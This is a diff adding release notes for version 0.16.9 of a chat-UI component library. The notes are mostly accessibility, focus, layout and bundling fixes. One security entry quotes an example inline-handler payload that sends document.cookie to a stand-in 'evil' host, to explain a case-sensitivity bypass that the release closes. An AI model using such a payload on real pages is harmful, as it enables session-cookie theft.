@@ -4,6 +4,222 @@ Every `@aparte/*` package is released together at one version. Per-package detai
 lives in each package's own `CHANGELOG.md`; this file is the aggregate, generated
 by `scripts/gen-root-changelog.mjs` (run as part of `pnpm version-packages`).
 
+## 0.16.9
+
+Every `@aparte/*` package ships at this version (they are released in lockstep).
+
+### Patch Changes
+
+- [2b1d809](https://github.com/apartejs/aparte/commit/2b1d809): A composer inside a chat host that has an `id` now stamps that id on `aparte-send`; on a page with two raw-core chats the reply no longer lands in the wrong one.
+
+  `submit()` read the bare `target` attribute. All four wrappers set it, so nothing changes there — but the documented quick start writes its markup by hand and nothing sets `target`, so every send from raw core carried `targetId: undefined` and the host delivered the answer to whichever chat it resolved first.
+
+  The composer's other outbound path, `cancel()`, already resolved through `_ownTargetId()` — the attribute if a wrapper set one, else the id of the `<aparte-chat>` / `[data-aparte-chat]` host above. `submit()` now resolves the same way, which is the invariant `cancel()`'s own docblock states: both sides answer the question "which chat am I" identically.
+  <sub>`@aparte/core`</sub>
+
+- [df0d60e](https://github.com/apartejs/aparte/commit/df0d60e): The ✕ that removes a pending attachment is 24px on touch, not 18px.
+
+  It is the only way to drop a file attached by mistake, and 18px is under the 24 of WCAG 2.2 SC 2.5.8. The coarse-pointer block already made the button visible there — a finger cannot hover — but left it at the size a mouse gets.
+
+  24 is not a new number: it is the box `aparte-btn--sm` already draws (`--aparte-btn-size-sm: 24px`), so the component simply stops out-specifying the recipe on touch. Not the 44px `--aparte-touch-target-size` its neighbours take: the composer's pending tile is 56px (`--aparte-attachment-image-size`, set on `aparte-composer-attachments`), so a 24px ✕ is already 43% of its edge and a 44px one would cover most of the picture — matching the neighbours properly means growing the tile too, a separate decision.
+  <sub>`@aparte/core`</sub>
+
+- [60e33eb](https://github.com/apartejs/aparte/commit/60e33eb): The composer's editor is exactly the control height at rest: its block padding derives from the control size and its own line (`--aparte-input-padding-y: calc((var(--aparte-composer-control-size) - 1lh) / 2)`), so the send and attachment buttons share the editor's centre on one line and follow its last line when the text wraps.
+
+  Measured on the built preview at 768: 36px buttons beside a 44px editor (10px of padding, a 24.3px line, 10px of padding) in a row aligned at the end, so the send button sat 4px below the editor's centre. A consumer who had set `--aparte-input-padding-y` keeps what they set; the default alone moves.
+  <sub>`@aparte/core`</sub>
+
+- [7fbd763](https://github.com/apartejs/aparte/commit/7fbd763): Cancelling or saving an inline message edit returns the focus to the bubble's action bar instead of dropping it to the top of the page.
+
+  Both exits destroy the element that holds the focus: the editor node is removed, and the action bar is rebuilt with `innerHTML`, so the ✓ / ✗ buttons go with it. Focus fell to `<body>`, and the next Tab restarted at the top of the document — a reader who edited the fourth message of a long transcript had to walk all the way back down to it.
+
+  The bubble now remembers the `data-action` of the button the editor was opened from and focuses that action again on the way out. The string, not the node: the bar's markup is rewritten twice between the two moments, so the node identity cannot survive. When the focus was outside the bubble when the editor opened, nothing is remembered and nothing is pulled back — that would be theft, not a restore.
+  <sub>`@aparte/core`</sub>
+
+- [79a55a3](https://github.com/apartejs/aparte/commit/79a55a3): Reaching the elicitation panel's "Other…" radio with the arrow keys now reveals the text field without moving the focus into it; a click or Space still focuses it.
+
+  Arrow keys select as they move inside a radiogroup, so the `change` they fire is not consent. Focusing on it carried a keyboard reader out of the group with no activation at all — WCAG SC 3.2.2 and its F36 failure, the same rule this panel already follows when it makes one choice one button.
+  <sub>`@aparte/core`</sub>
+
+- [204343f](https://github.com/apartejs/aparte/commit/204343f): Lifecycle events (`aparte-message-start`/`-done`/`-error`/`-aborted`, and the tool-approval request) now carry the chat's id when the render target is a shell's viewport, so a second chat on the page no longer answers to the first one's turn.
+
+  The stamp read `target.id`, and the target is whatever RENDERS: an `<aparte-chat>` shell delegates rendering to its `.viewport`, which has no id of its own. So on every shell-shaped chat the events went out with `targetId: undefined` — and the receive side reads a missing id as "for me", deliberately, so a single-chat page needs no wiring.
+
+  On a two-chat page that made one chat's turn drive every composer: chat B finishing re-enabled chat A's send button mid-stream and evicted A's open elicitation panel, so the question vanished under the user's cursor while A's tool call kept waiting. The client now resolves the id by climbing to the chat host — the same rule `aparte-composer` uses to identify itself, so the two halves of the channel cannot disagree — and `target.id` remains the fallback, which is correct for the viewport-only chat shape.
+  <sub>`@aparte/core`</sub>
+
+- [4cfda77](https://github.com/apartejs/aparte/commit/4cfda77): Uppercase and mixed-case `on*` props (`ONCLICK`) are now dropped like lowercase ones; they previously became live inline handlers.
+
+  `applyElementProps` — what the React and Angular wrappers use to spread a consumer's prop bag onto an aparté element — refused `onclick` but tested the key with `key.startsWith('on')`, which only ever matched the lowercase spelling. An attribute name is case-insensitive, so `{ ONCLICK: 'fetch("//evil/?" + document.cookie)' }` fell through to `setAttribute` and wrote exactly the `onclick` the branch existed to refuse.
+
+  The check is now `key.toLowerCase().startsWith('on')`, the idiom core's sanitizer already uses. The lowercasing is scoped to that one branch: a CSS custom property IS case-sensitive, so the `--` branch keeps the key it was given.
+  <sub>`@aparte/core`</sub>
+
+- [8a77487](https://github.com/apartejs/aparte/commit/8a77487): The sidebar drawer keeps the keyboard when its search filter hides rows: Tab wraps from the last visible control instead of walking out onto the page under the scrim.
+
+  The trap listed its stops with `querySelectorAll` and treated the DOM-last one as the end of the drawer. The drawer's own search field hides non-matching rows with `hidden`, and a hidden row's buttons hold no tab stop — so after typing one letter the "last" stop was unreachable, the wrap never fired, and Tab from the last control a reader could actually see left the drawer for the transcript underneath. Opening the drawer had the same blind spot: it focused the DOM-first control even when that one was hidden.
+
+  Both now count only what a reader can reach (`[hidden]` ancestors excluded, plus `checkVisibility()` where the browser offers it, which also catches a `display: none` from a host stylesheet).
+  <sub>`@aparte/core`</sub>
+
+- [7fbd763](https://github.com/apartejs/aparte/commit/7fbd763): Leaving a bubble's inline editor now lands on a button the reader can actually use, and moves the action bar's tab stop with it.
+
+  The restore added in the previous patch focused the button that opened the editor, but stopped there, and two cases in its own subject — the reader must not lose their place — still lost it.
+
+  The bar is a `role="toolbar"`: one tab stop that the arrows move. Rebuilding it parks that stop on the first button (copy), so focusing edit put the reader on a `tabindex="-1"` member — Shift+Tab out and Tab back returned them to copy, not to the button they were on. The restore now sets the stop before focusing, the same two lines the arrow-key handler already uses.
+
+  And the remembered action can come back **disabled** — the reader sent from the composer mid-edit, so the transcript is busy and edit is rebuilt disabled — or gone, if the action was turned off while the editor was open. `focus()` on a disabled button is a no-op, so the focus fell to `<body>`: the exact bug, silently. The restore now falls back to the bar's first enabled button.
+  <sub>`@aparte/core`</sub>
+
+- [204343f](https://github.com/apartejs/aparte/commit/204343f): Retry and edit no longer put empty assistant turns on the wire: a failed turn, or one stopped before its first token, is dropped the same way send drops it.
+
+  Send, retry and edit all answer the same question — what did this conversation say so far? — and they answered it with two different pieces of code. Send filtered out errored turns and anything whose wire text came out empty; retry and edit kept every user and assistant row whatever its status, so a failed turn reached the model as `{ role: 'assistant', content: '' }`. Some providers reject that outright; the rest read it as an empty reply worth imitating.
+
+  The slice stays each caller's own business — retry cuts before the reply it regenerates, edit after the message being reworded, send at the last answered turn. What a message contributes to the wire is now one rule the three of them share.
+  <sub>`@aparte/core`</sub>
+
+- [191aa24](https://github.com/apartejs/aparte/commit/191aa24): The `<aparte-chat-status>` caveat names the tokens the sheet actually reassigns (`--aparte-message-padding-block` / `-inline`); the theming guide and the landing page stop offering two variables 0.16.8 removed.
+
+  `--aparte-message-padding` was split into `-block` / `-inline` and `--aparte-avatar-radius` became `--aparte-avatar-radius-ratio` (a fraction of `--aparte-avatar-size`, not a length — the guide now says so, because swapping the name and passing `6px` is the natural next mistake). Both kept being offered: in the theming guide's grouped token list, in the status element's own JSDoc — which the generated component page reprints — and, for the avatar one, in the landing page's three-line "one instance, three variables" snippet, the page whose whole job is to make the theming promise credible.
+
+  A name that does not exist fails in silence: the declaration is invalid at computed-value time, the property inherits, and the page looks almost right. That is the exact failure the same guide has a section warning about, so the pages taught the mistake they teach you to avoid. `check:derived-vars` now reads variable names out of that prose — the two pages plus every JSDoc block in core's and the plugins' source — and refuses one the library cannot answer to; a family prefix (`--aparte-code-*`) and a line marked `undeclared-on-purpose` are the two exceptions, the second for the guide's own worked example of a name core does not declare.
+  <sub>`@aparte/core`</sub>
+
+- [2b1d809](https://github.com/apartejs/aparte/commit/2b1d809): Closing or evicting a composer panel no longer steals the focus: the caret stays where the reader put it unless focus was inside the composer.
+
+  `_teardownPanel()` ended on an unconditional `this.focus()`, which forwards to the composer's editor. So every close moved the caret there — including the one nobody asks for: a turn ending evicts any open panel, and a turn ends because the model finished. A reader who had moved to another chat's field, a search box, or a link was pulled back mid-keystroke.
+
+  It now asks first, and asks BEFORE removing the panel: removing the focused element drops focus to `<body>`, after which the question has no answer. That is the reasoning `<aparte-elicitation>`'s own restoration already records — and its guard was being defeated by this one, since the teardown ran first and put the focus back inside the composer, which made "was the reader still in the panel?" answer yes.
+  <sub>`@aparte/core`</sub>
+
+- [04b9dd0](https://github.com/apartejs/aparte/commit/04b9dd0): The scroll rail's first and last tick are full 24px targets: the rail pads its block axis so its own clipping no longer cuts them in half.
+
+  `--aparte-scroll-rail-hit-size` grows the pressable zone symmetrically around the drawn line — half of `hit − thickness` above it and half below. `aparte-scroll-rail` clips (`overflow: hidden`, which cuts at the padding box) and had no padding, and `.aparte-scroll-rail__list` has none either, so the first tick's top edge sat exactly on the clip line: its upper 11px were cut, and the last tick's lower 11px with it, for paint and for hit-testing alike. Two 13px targets, under WCAG 2.5.8's 24px — and they are the two a reader aims at most, "jump to the first message" and "jump to the latest".
+
+  The fix is the room, not a smaller zone: `padding-block: calc((hit − thickness) / 2)` puts the clip line outside every zone instead of through the two end ones. The inline axis already had this reasoning — it is why a zone grows inward only and why `--aparte-scroll-rail-width` carries the hit size as a floor — and it simply had not been carried to the block axis.
+
+  What moves if you had measured the rail: it is `box-sizing: border-box` now, so `max-height` still means the same outer box, and the ticks get 22px less room inside it — a very long transcript clips one tick sooner. The drawn line, the pitch and every token are unchanged.
+  <sub>`@aparte/core`</sub>
+
+- [04b9dd0](https://github.com/apartejs/aparte/commit/04b9dd0): The scroll rail is positioned inside the chat under the Angular wrapper too, and no longer gets pulled back into the flow in overlay mode.
+
+  `<aparte-scroll-rail>` is `position: absolute`, so it lands in the nearest positioned ancestor. The recipe hands the shell that containing block with `:has()`, and it listed two of the three shell shapes core's own layout already knows: the vanilla `<aparte-chat>` and the `[data-aparte-chat]` div React/Vue/Svelte render. Angular's host IS `<aparte-chat>` but its shell is the inner `.aparte-chat-container`, and that div carries no attribute — so a rail inside an Angular chat escaped to whatever ancestor happened to be positioned, in the ordinary case the page. `.aparte-chat-container:has(> aparte-scroll-rail)` closes it; the other two wrappers' root already carries both the class and the attribute, so nothing moves for them.
+
+  The second half is the same rail, in overlay mode. The bottom-stack rule said `> :not(aparte-chat-viewport)` on the premise that the only child which is not the viewport IS the stack — true when it was written, and the rail made it false: it matched, took `position: relative`, and the one child that floats by design dropped into the flow above the composer. The `:not()` now names both.
+  <sub>`@aparte/core`</sub>
+
+- [04b9dd0](https://github.com/apartejs/aparte/commit/04b9dd0): Scroll-rail ticks are 24px click targets on a 24px pitch. `--aparte-scroll-rail-hit-size` is the new knob and `--aparte-scroll-rail-gap` now derives from it, so fewer ticks fit in the rail before it clips.
+
+  A tick is a `<button>` that jumps the transcript, and it was drawn as the line it stands for: the pressable zone measured 22×10 CSS px on a 10px pitch, under WCAG 2.5.8's 24×24 minimum with no spacing exemption to fall back on (the exemption is measured on a 24px circle per target, and at a 10px pitch the neighbours' circles overlap). The rail hides entirely under `(pointer: coarse)`, so the bar is 2.5.8's 24px rather than 2.5.5's 44px.
+
+  Growing only the pseudo-element would have satisfied the letter of the rule and made mis-hits worse — two 24px zones on a 10px pitch overlap by 14px, and the z-order then decides every press — so the pitch rises with the zone: `--aparte-scroll-rail-gap` is `hit − thickness`, which makes gap + thickness exactly the pitch and the zones tile edge to edge.
+
+  What to change if you had tuned these: set `--aparte-scroll-rail-hit-size` rather than `--aparte-scroll-rail-gap`, since the gap now follows it. `--aparte-scroll-rail-width` takes the hit size as a floor (`max(…)`) because the rail clips: a narrower column cut the zone back on the very edge a reader aims at. The drawn line is unchanged at 14×2.
+  <sub>`@aparte/core`</sub>
+
+- [ce72d8e](https://github.com/apartejs/aparte/commit/ce72d8e): A searchable `<aparte-select>` again announces which option is selected: its trigger's accessible name is now `"<control>: <selected label>"` (e.g. "Pick a model: GPT-4o mini") instead of the control's name alone.
+
+  `searchable` makes the trigger a `role="button"`, and a button takes its name from its content — which an author `aria-label` overrides. The name written for the combobox shape (where the visible label span was the VALUE and the attribute only the NAME) therefore swallowed the selection: readers heard "Pick a model, button" and never the model. The name now carries both halves, follows every selection change, and drops the second half when it would only repeat the first. The listbox keeps the control's name, and a non-searchable select is unchanged.
+  <sub>`@aparte/core`</sub>
+
+- [204343f](https://github.com/apartejs/aparte/commit/204343f): `history: 'viewport'` now sends assistant turns a host seeded without a `status`; the whole transcript used to be dropped and the model got only the new question.
+
+  `status` is optional on `AparteMessage`, and a host that seeds a transcript — restoring a saved conversation, hydrating a server-rendered one — has no reason to invent one for turns that are already over. `_toHistoryMessages` gated on `status === 'completed'`, so with none the cutoff never advanced past the first message and every seeded turn was sliced away. Nothing in the UI showed it: the viewport still rendered the whole conversation, and only the next request was missing it.
+
+  Both gates now ask "is this still in flight?" instead: a `streaming` or `pending` turn is held back, an `error` turn is still dropped and still does not advance the cutoff, and everything else — status or no status — is history.
+  <sub>`@aparte/core`</sub>
+
+- [ce72d8e](https://github.com/apartejs/aparte/commit/ce72d8e): A searchable `<aparte-select>` now puts `role="combobox"`, `aria-expanded`, `aria-controls` and the roving `aria-activedescendant` on the filter field instead of the trigger, so the arrow-key highlight is announced. The trigger becomes a `role="button"` when (and only when) the field exists; without `searchable` nothing changes.
+
+  Opening a searchable select focuses the filter field, and a screen reader follows focus — so the combobox state has to live there. It lived on the trigger: the highlight moved with every ArrowDown and was announced to nobody, and the control declared two comboboxes for one value. `aria-expanded` now follows the open state on both elements.
+  <sub>`@aparte/core`</sub>
+
+- [ce72d8e](https://github.com/apartejs/aparte/commit/ce72d8e): A disabled `<aparte-select>` no longer removes the `open` attribute you wrote, and opens the moment you remove `disabled`.
+
+  `open` is the consumer's attribute, and a one-way binding writes it once: taking it back left the template saying open and the element saying closed, with no write left to reconcile them — `<aparte-select [disabled]="true" [open]="true">` in Angular went to the element and came straight back out. The select still refuses to open while disabled; the attribute simply stands, and the `disabled` branch honours it on the way out, symmetrically to the close it already does on the way in.
+  <sub>`@aparte/core`</sub>
+
+- [ce72d8e](https://github.com/apartejs/aparte/commit/ce72d8e): Setting `open` on `<aparte-select>` — the attribute or the property, after mount or in the initial markup — now runs the same path as a click: `aria-expanded` follows in both directions, the keyboard highlight is seeded on open and cleared on close, and `aparte-select-open` / `aparte-select-close` fire once per transition. A disabled select still refuses to open, and drops the `open` attribute rather than leaving it claiming otherwise.
+
+  The attribute had a branch of its own that unhid the panel and stopped there, so the documented way to control the dropdown produced a state a click never produces: a visible list announced as collapsed, with the arrow keys starting from nowhere. The branch now delegates, guarded against the re-entry the two methods' own reflecting writes cause.
+  <sub>`@aparte/core`</sub>
+
+- [ce72d8e](https://github.com/apartejs/aparte/commit/ce72d8e): Re-parenting an open `<aparte-select>` no longer fires a second `aparte-select-open` or resets the keyboard highlight: a portal, a Vue teleport or any framework move keeps the dropdown exactly where it was.
+
+  `connectedCallback` runs on every re-connect, and routing the mount-time `open` attribute through the open path made a move look like a transition — the event fired again and the highlight was re-seeded on the selected option, losing where the arrow keys had got to. Mount now only opens when the element is not already open, and `_openDropdown()` returns early when it is, so every entry into it (attribute, property, click, re-connect) is idempotent.
+  <sub>`@aparte/core`</sub>
+
+- [c9d863d](https://github.com/apartejs/aparte/commit/c9d863d): Renaming a conversation now keeps the focus on the row when you leave the field by Tab or by clicking away, not only on Enter.
+
+  Every exit re-renders the list, so the field the reader was typing in stops existing. Enter and Escape put the row's title button back under the keyboard; the blur path passed a hard-coded `false` and left the focus on `<body>`, so the next Tab restarted at the top of the page. It now looks at where the focus is going: nowhere, or somewhere inside the list this render is about to destroy, and the row takes it back — a live control outside the list keeps it, since pulling it back from there would be theft.
+
+  The restore also moved after the `aparte-rename-conversation` event rather than before it. A host that re-assigns `conversations` when it hears that event re-renders the list, which destroyed the button that had just been focused — so even Enter lost the row in the one integration that matters most.
+  <sub>`@aparte/core`</sub>
+
+- [6e7386b](https://github.com/apartejs/aparte/commit/6e7386b): `<aparte-chat-status>` now carries a screen-reader-only word inside its live region, so the default dots-only form is announced instead of being silent.
+
+  The container is `role="status" aria-live="polite"`, and a live region announces its CONTENT. In the dots-only default that content was an `aria-hidden` dot and an empty span — the empty string — so the whole state rode on `aria-label`, which names the region rather than reporting it. A sighted reader saw the dots pulse; a screen-reader user was told nothing.
+
+  One writer now keeps exactly one of the two text nodes populated: the visible `.aparte-status-text` when the `text` attribute is set (the label is already that same string, so a second copy would be read twice), and a new `.aparte-status-sr` span wearing the existing `.aparte-sr-only` recipe when it is not. No new CSS, no new token, and the documented dots-only LOOK is unchanged — nothing visible was added.
+
+  One edge aligns as a consequence: mounting with an empty `text=""` used to print the literal `Typing` on screen, where setting `text=""` after mount cleared it. Both paths now read an empty attribute as the dots-only default.
+  <sub>`@aparte/core`</sub>
+
+- [6e7386b](https://github.com/apartejs/aparte/commit/6e7386b): `<aparte-chat-status>` writes its fallback word into the live region when `visible` arrives, and clears it when `visible` leaves — so a screen reader hears the indicator on every turn, not just in theory.
+
+  The word was there already; it was written at the wrong moment. `_render()` put `Typing` in the screen-reader span while the host was still `display: none` (`aparte-chat-status:not([visible])` hides it, and all four wrappers mount the element once and flip the attribute). So the region was never MUTATED while it was exposed: it appeared with its text already in it — the reveal-from-hidden path assistive tech is documented not to announce reliably — and from the second turn on there was not even a reveal-time difference, the string being byte-identical to what was sitting there.
+
+  Driving it from visibility makes each turn a real content change on a region that is already on screen, which is the path that announces. Nothing about the look moves: the dots-only line is still dots-only, and when `text` is set the visible span carries it exactly as before, with the screen-reader span left empty so the line is read once.
+
+  If you drive the element by hand rather than through a wrapper, `show()`/`hide()` (or the `visible` attribute) is now what puts the word in the region — mounting it without `visible` leaves the region empty, as it should, since the element is not on screen.
+  <sub>`@aparte/core`</sub>
+
+- [52a9a00](https://github.com/apartejs/aparte/commit/52a9a00): The tabs recipe's examples now ship the roving `tabindex`, `aria-controls` and `aria-labelledby` that their `role="tablist"` promises, and the segmented variant has a panel. Copying the banner markup no longer copies a defect.
+
+  The examples are the live preview the kit page renders, and they showed a `role="tablist"` of plain buttons: every tab a tab stop, none of them naming a panel — which announces more than plain buttons and does less. The banner now also says which part stays the app's (the ArrowLeft/ArrowRight/Home/End handler) and points at a working one.
+  <sub>`@aparte/core`</sub>
+
+- [97eb642](https://github.com/apartejs/aparte/commit/97eb642): The image-preview button is now the thumbnail image rather than the tile: the ✕ is no longer a button nested inside a button, and the tile no longer announces its file name three times.
+
+  In the composer's pending strip, `role="button"` sat on the tile, and the tile wraps the remove `<button>`. No role permits a button inside a button, and the outer one takes its name from its contents — so a screen reader read the file name from the `title`, again from the hover overlay, and a third time inside "Remove report.png", then offered two nested controls with no way to tell which an Enter would reach.
+
+  The role, the tab stop and an explicit `aria-label` (the file name, once) now sit on the `<img>`, which is what the preview opens; the ✕ sits beside it. Its focus ring is drawn inset, because the tile is the frame and clips: an outline drawn outward from an image that fills the tile would not be visible at all.
+
+  The sent-message strip in the bubble is unchanged and keeps the role on its tile — it has no ✕, so nothing is nested and the tile is the whole control.
+  <sub>`@aparte/core`</sub>
+
+- [7389228](https://github.com/apartejs/aparte/commit/7389228): A Stop now ends the run immediately even when a tool handler ignores its abort signal — the turn no longer sits until `toolTimeoutMs` (five minutes by default), and a handler that resolves after the Stop no longer appends a tool result.
+
+  `invokeToolHandler` already raced the per-call TIMEOUT, for a measured reason: aborting a controller is a request a handler is free to ignore, and the default shape of a consumer tool — `async () => ({ content: await fetch(...).then(r => r.text()) })` — never reads its signal. The parent abort was left out of that race. It only ran `onParentAbort`, which aborts the same child controller the deaf handler ignores, so a Stop pressed while a tool was in flight changed nothing the user could see: the loop stayed parked on the handler, the typing indicator stayed up, and `run-aborted` arrived only once the timeout budget expired.
+
+  The parent signal is now a third racer beside the timeout, on the same terms: the signal still fires first, so a handler that honours it keeps the chance to reject cleanly, and the racer only decides the case where it does not. The listener is removed in the `finally` alongside the existing one, so a long turn does not accumulate listeners on the run's signal.
+  <sub>`@aparte/engine`</sub>
+
+- [2cd2c50](https://github.com/apartejs/aparte/commit/2cd2c50): The worker now ships as `dist/worker.js` and is constructed from a literal `new URL('./worker.js', import.meta.url)`, so a bundled app resolves `@huggingface/transformers` inside the worker instead of failing on every model load. No configuration changes on your side — no worker loader, no copy rule, no entry of your own.
+
+  `_spawnWorker` carries a comment saying that literal "is not style": it is the exact shape Vite's worker detection and webpack's WorkerPlugin match on, and matching it is what makes a consumer's bundler process the worker as a MODULE rather than copy it as an opaque asset. The claim was true of the source and false of the published bytes. The build handed the emit to Vite's own worker plugin, which rewrote the call to `new Worker(new URL(/* @vite-ignore */ "" + new URL("assets/worker-<hash>.js", import.meta.url).href, import.meta.url))` — nothing static left for anyone to detect. The chunk was then copied verbatim, its `import('@huggingface/transformers')` stayed a bare specifier no browser can resolve, and it also pulled two sibling hashed runner chunks a consumer's build never emitted.
+
+  Two things had to become true: the worker must sit at a stable path a bundler can be pointed at, and it must contain no specifier a verbatim copy cannot resolve. It is a second lib entry now, so `dist/worker.js` and `dist/runners/{shared,text-generation,image-text-to-text}.js` are real published files with names — relative between themselves, so they follow the worker to whatever origin serves it, and `@huggingface/transformers` is the one bare specifier left. The build removes Vite's `worker-import-meta-url` and `asset-import-meta-url` transforms, which is what lets the literal survive into the artifact; dev and the test run keep them, since that is what resolves `./worker.js` to `src/worker.ts` there.
+
+  Both halves are now asserted against the built bytes rather than the source — `src/__tests__/published-shape.test.ts` for the literal and the file, and a `check:bundle-entries` contract that walks the worker's chunks for stray specifiers. The defect existed only in the output, so only a test that reads the output could have seen it.
+
+  The cross-origin `blob:` path is unchanged: same behaviour, same CSP note, same error message.
+  <sub>`@aparte/provider-transformers`</sub>
+
+- [a78320a](https://github.com/apartejs/aparte/commit/a78320a): `summaryMaxTokens` reserves room in the window budget; it never truncated the summary and no longer claims to.
+
+  Its JSDoc read "Hard cap for summary tokens" and `summaryRatio`'s read "Ratio of history budget allocated to the summary block", so both described a bound on the text a summariser returns. `splitHistoryBudget` uses them for one thing: `summary = min(summaryMaxTokens, budget × summaryRatio)`, and that number is subtracted from the verbatim window. Nothing measures a summary against it and nothing clips one — a summariser that overruns simply costs the turn more than the split assumed, silently, which is the failure mode a reader trusting the word "cap" would never look for.
+
+  Words only: `splitHistoryBudget`, the defaults and the numbers are untouched. If you need a real bound, clip inside your own `summarize`.
+  <sub>`@aparte/plugin-compaction`</sub>
+
+- [9a1f93c](https://github.com/apartejs/aparte/commit/9a1f93c): `<AparteChat>` and `<AparteUi>` accept callback props alongside their events: `onmessageSent`, `onaction`, `onmessagesChange`, `onmessageAppended`, `ontypingChange`, `onconversationCreated` on the chat, `onelementEvent` on the element host. Each is called with the payload itself (no `CustomEvent` to unwrap), in addition to the event, so a Svelte 4 consumer changes nothing and a Svelte 5 consumer never writes `on:` on a component. The Svelte 5 example now runs in runes mode on those callbacks.
+
+  Svelte 5 documents `createEventDispatcher` as deprecated and recommends callback props; measured before this landed, the 5.56 compiler warns on neither the dispatcher nor `on:` on a component (only on `on:` for a DOM element in runes mode), so this is the framework's idiom arriving in the wrapper, not an emergency. The other three wrappers already speak theirs: React props, Vue emits, Angular outputs.
+  <sub>`@aparte/svelte`</sub>
+
+<sub>Version-only bumps (no changes of their own): `@aparte/provider-ai-sdk`, `@aparte/provider-openai-compat`, `@aparte/provider-scenario`, `@aparte/plugin-approval`, `@aparte/plugin-artifacts`, `@aparte/plugin-ask-user`, `@aparte/plugin-marked`, `@aparte/plugin-model-selector`, `@aparte/plugin-shiki`, `@aparte/plugin-streaming-markdown`, `@aparte/angular`, `@aparte/react`, `@aparte/vue`, `@aparte/locale-fr`, `@aparte/docs-mcp`.</sub>
+
 ## 0.16.8
 
 Every `@aparte/*` package ships at this version (they are released in lockstep).
